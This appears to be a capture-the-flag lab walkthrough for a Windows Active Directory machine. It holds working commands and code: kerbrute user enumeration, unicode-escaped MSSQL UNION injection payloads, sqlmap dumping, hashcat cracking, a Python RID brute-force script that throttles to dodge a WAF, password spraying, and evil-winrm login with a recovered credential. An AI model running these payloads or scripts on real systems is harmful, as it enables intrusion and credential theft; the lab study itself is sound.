
```
enum4linux -a 10.10.10.179
```

```
Domain Name: MEGACORP                                                         
Domain Sid: S-1-5-21-3167813660-1240564177-918740779
```


So after adding the IP in the host file got this 
![[Pasted image 20240919042226.png]]


```
kerbrute userenum -d MEGACORP.LOCAL --dc 10.10.10.179 userlist.txt -t 100
```


```
andrew@MEGACORP.LOCAL
james@MEGACORP.LOCAL
Andrew@MEGACORP.LOCAL
dai@MEGACORP.LOCAL
administrator@MEGACORP.LOCAL
alice@MEGACORP.LOCAL
ANDREW@MEGACORP.LOCAL
lana@MEGACORP.LOCAL
Administrator@MEGACORP.LOCAL
rmartin@MEGACORP.LOCAL
pmartin@MEGACORP.LOCAL
```


So we have the users will try the login page now
```
andrew
james
dai
administrator
alice
ANDREW
lana
Administrator
rmartin
pmartin
```


So the login page is a dead end but when i pressed entered in colleague finder look what we got a list of valid users
![[Pasted image 20240919153405.png]]

```
sbauer@megacorp.htb
okent@megacorp.htb
ckane@megacorp.htb
kpage@megacorp.htb
shayna@megacorp.htb
james@megacorp.htb
cyork@megacorp.htb
rmartin@megacorp.htb
zac@magacorp.htb
jorden@megacorp.htb
alyx@megacorp.htb
ilee@megacorp.htb
nbourne@megacorp.htb
zpowers@megacorp.htb
aldom@megacorp.htb
minato@megacorp.htb
egre55@megacorp.htb
```

2024/09/19 15:37:38 >  Done! Tested 17 usernames (14 valid) in 0.816 seconds

```
sbauer@megacorp.htb
okent@megacorp.htb
ckane@megacorp.htb
kpage@megacorp.htb
james@megacorp.htb
cyork@megacorp.htb
rmartin@megacorp.htb
zac@magacorp.htb
jorden@megacorp.htb
alyx@megacorp.htb
ilee@megacorp.htb
nbourne@megacorp.htb
zpowers@megacorp.htb
aldom@megacorp.htb
```

So now i think we can run the sql injection in this as it reminds me of DVWA 

So we technically have 5 fields
![[Pasted image 20240919160202.png]]

```
"id":1,
"name":"Sarina Bauer",
"position":"Junior Developer",
"email":"sbauer@megacorp.htb",
"src":"sbauer.jpg"
```


Let's automate the process and see which payload works and which is not 
```
wfuzz -c -u http://10.10.10.179/api/getColleagues -w /usr/share/seclists/SecLists-master/Fuzzing/special-chars.txt -d '{"name":"FUZZ"}' -H 'Content-Type: application/json;charset=utf-8'
```

![[Pasted image 20240919183727.png]]


So will try ' and it's value is 
```
\u27
```
and guess what we got an error

![[Pasted image 20240919184156.png]]

```
\u0027
```
![[Pasted image 20240919184507.png]]


```
sqlmap -r post_me.txt --tamper=charunicodeescape --delay 3 --level 5 --risk 3 --dbms=mssql -technique=U --batch --dump-all --exclude-sysdbs -v 3
```


And and and finally this command worked
```
sqlmap -r colleagues.req --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch --dump-all --exclude-sysdbs
```

![[Pasted image 20240920032509.png]]

```
id | password                                                                                         | username |
+----+--------------------------------------------------------------------------------------------------+----------+
| 1  | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | sbauer   |
| 2  | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa | okent    |
| 3  | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | ckane    |
| 4  | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | kpage    |
| 5  | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | shayna   |
| 6  | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | james    |
| 7  | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | cyork    |
| 8  | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa | rmartin  |
| 9  | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | zac      |
| 10 | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | jorden   |
| 11 | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa | alyx     |
| 12 | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | ilee     |
| 13 | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa | nbourne  |
| 14 | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | zpowers  |
| 15 | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | aldom    |
| 16 | cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc | minatotw |
| 17 | cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc | egre55 
```


```
9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa
68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa
68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa
68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa
68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc
cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc
```

So seeing the length of the hashes it's a sha but don't know if it's 256-512 or in b/w 
after some research on HashCat wiki i confirmed that it's hash 384 but didn't know if it's 
sha2 or sha3 or what.
10800	SHA2-384
17500 SHA3-384
17900 Keccak-384

And finally this worked
```
.\hashcat.exe -m 17500 -D 2 .\hashes4.txt .\rockyou.txt -O
```

```
9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739:password1
68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813:finance1
fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa:banking1
Approaching final keyspace - workload adjusted.
```

Password
```
password1
finance1
banking1
```


So let's validate the password
```
crackmapexec smb 10.10.10.179 -u new_user.txt -p password.txt 
```


So tested the new users
```
kerbrute userenum -d MEGACORP.LOCAL --dc 10.10.10.179 testing.txt -t 100 
```
![[Pasted image 20240922030306.png]]


So everthing is a dead end so i refer the walkthrough and guess what there is again a sql injection to be performed.

There are many [well-known](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers) RID like **512** for the **Domain Admins** group. Let’s build a request to find out what if this attack works.
```
hello' UNION SELECT 1,sys.fn_varbintohexstr(SUSER_SID('MEGACORP\Domain Admins')),3,4,5--
```


```
\u0027\u0020\u0055\u004E\u0049\u004F\u004E\u0020\u0053\u0045\u004C\u0045\u0043\u0054\u0020\u0031\u002C\u0073\u0079\u0073\u002E\u0066\u006E\u005F\u0076\u0061\u0072\u0062\u0069\u006E\u0074\u006F\u0068\u0065\u0078\u0073\u0074\u0072\u0028\u0053\u0055\u0053\u0045\u0052\u005F\u0053\u0049\u0044\u0028\u0027\u004D\u0045\u0047\u0041\u0043\u004F\u0052\u0050\u005C\u0044\u006F\u006D\u0061\u0069\u006E\u0020\u0041\u0064\u006D\u0069\u006E\u0073\u0027\u0029\u0029\u002C\u0033\u002C\u0034\u002C\u0035\u002D\u002D
```

Final Payload
```
hello\u0027\u0020\u0055\u004E\u0049\u004F\u004E\u0020\u0053\u0045\u004C\u0045\u0043\u0054\u0020\u0031\u002C\u0073\u0079\u0073\u002E\u0066\u006E\u005F\u0076\u0061\u0072\u0062\u0069\u006E\u0074\u006F\u0068\u0065\u0078\u0073\u0074\u0072\u0028\u0053\u0055\u0053\u0045\u0052\u005F\u0053\u0049\u0044\u0028\u0027\u004D\u0045\u0047\u0041\u0043\u004F\u0052\u0050\u005C\u0044\u006F\u006D\u0061\u0069\u006E\u0020\u0041\u0064\u006D\u0069\u006E\u0073\u0027\u0029\u0029\u002C\u0033\u002C\u0034\u002C\u0035\u002D\u002D
```


```
0x0105000000000005150000001c00d1bcd181f1492bdfc23600020000
```
![[Pasted image 20240922042724.png]]


Let's break down this 
56 Bytes
```
0x0105000000000005150000001c00d1bcd181f1492bdfc23600020000
```

48 bytes are the SID
```
0x0105000000000005150000001c00d1bcd181f1492bdfc236
```

8 bytes are the RID
```
0x00020000
```


```
' UNION SELECT 1,SUSER_SNAME(0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000),3,4,5--
```

```
\u0027\u0020\u0055\u004E\u0049\u004F\u004E\u0020\u0053\u0045\u004C\u0045\u0043\u0054\u0020\u0031\u002C\u0053\u0055\u0053\u0045\u0052\u005F\u0053\u004E\u0041\u004D\u0045\u0028\u0030\u0078\u0030\u0031\u0030\u0035\u0030\u0030\u0030\u0030\u0030\u0030\u0030\u0030\u0030\u0030\u0030\u0035\u0031\u0035\u0030\u0030\u0030\u0030\u0030\u0030\u0031\u0063\u0030\u0030\u0064\u0031\u0062\u0063\u0064\u0031\u0038\u0031\u0066\u0031\u0034\u0039\u0032\u0062\u0064\u0066\u0063\u0032\u0033\u0036\u0066\u0034\u0030\u0031\u0030\u0030\u0030\u0030\u0029\u002C\u0033\u002C\u0034\u002C\u0035\u002D\u002D
```

Another Payload
```
hello\u0027\u0020\u0055\u004E\u0049\u004F\u004E\u0020\u0053\u0045\u004C\u0045\u0043\u0054\u0020\u0031\u002C\u0053\u0055\u0053\u0045\u0052\u005F\u0053\u004E\u0041\u004D\u0045\u0028\u0030\u0078\u0030\u0031\u0030\u0035\u0030\u0030\u0030\u0030\u0030\u0030\u0030\u0030\u0030\u0030\u0030\u0035\u0031\u0035\u0030\u0030\u0030\u0030\u0030\u0030\u0031\u0063\u0030\u0030\u0064\u0031\u0062\u0063\u0064\u0031\u0038\u0031\u0066\u0031\u0034\u0039\u0032\u0062\u0064\u0066\u0063\u0032\u0033\u0036\u0066\u0034\u0030\u0031\u0030\u0030\u0030\u0030\u0029\u002C\u0033\u002C\u0034\u002C\u0035\u002D\u002D
```

```
MEGACORP\\Administrator
```


Let's automate this process
```
import json
import requests
from time import sleep

url = 'http://10.129.247.110/api/getColleagues'

# Encode our payload
def encode_me(str):
    val = []
    for i in str:
        val.append("\\u00"+hex(ord(i)).split("x")[1])
    
    return ''.join([i for i in val])

# Iterate RID
sid = ''
for i in range(500,10000):
    i = hex(i)[2:].upper()
    if len(i) < 4:
        i = '0' + i

    # Reverse our RID
    t = bytearray.fromhex(i)
    t.reverse()
    t = ''.join(format(x,'02x') for x in t).upper()+'0'*4

    # Build the request
    sid = '0x0105000000000005150000001c00d1bcd181f1492bdfc236{}'.format(t)
    payload = "hello' UNION SELECT 1,SUSER_SNAME({}),3,4,5--".format(sid)  
    r = requests.post(url,data='{"name":"'+ encode_me(payload) + '"}',headers={'Content-Type': 'Application/json'})

    user = json.loads(r.text)[0]["name"]

    if user:
        print(user)

    # Sleep to avoid triggering the WAF
    sleep(3)
```


So only thing to keep in mind like when i got the password i rushed to use it with the userlist i got and wasted my time.

Instead there was another SQL injection which we got to know. Only thing to keep in mind is think out of the box.

```
MEGACORP\Administrator
MEGACORP\Guest
MEGACORP\krbtgt
MEGACORP\DefaultAccount
MEGACORP\Domain Admins
MEGACORP\Domain Users
MEGACORP\Domain Guests
MEGACORP\Domain Computers
MEGACORP\Domain Controllers
MEGACORP\Cert Publishers
MEGACORP\Schema Admins
MEGACORP\Enterprise Admins
MEGACORP\Group Policy Creator Owners
MEGACORP\Read-only Domain Controllers
MEGACORP\Cloneable Domain Controllers
MEGACORP\Protected Users
MEGACORP\Key Admins
MEGACORP\Enterprise Key Admins
MEGACORP\RAS and IAS Servers
MEGACORP\Allowed RODC Password Replication Group
MEGACORP\Denied RODC Password Replication Group
MEGACORP\MULTIMASTER$
MEGACORP\DnsAdmins
MEGACORP\DnsUpdateProxy
MEGACORP\svc-nas
MEGACORP\Privileged IT Accounts
MEGACORP\tushikikatomo
MEGACORP\andrew
MEGACORP\lana
MEGACORP\alice
MEGACORP\test
```
![[Pasted image 20240924020635.png]]
![[Pasted image 20240924034656.png]]

Let's try the password here.
```
crackmapexec smb 10.10.10.179 -u n_user.txt -p password.txt
```
![[Pasted image 20240924035700.png]]

Salute we got a initial access i think so
```
MEGACORP.LOCAL\tushikikatomo:finance1 
```

User
```
tushikikatomo
```

Password
```
finance1 
```


```
crackmapexec smb 10.10.10.179 -u 'tushikikatomo' -p 'finance1' --shares
```
![[Pasted image 20240924040150.png]]

Let's get the initial access as it's time for Evil-winrm
```
evil-winrm -u 'tushikikatomo' -p 'finance1' -i 10.10.10.179
```

![[Pasted image 20240924040538.png]]

```
5e190d5ee99842b7a37896bad63f948b
```
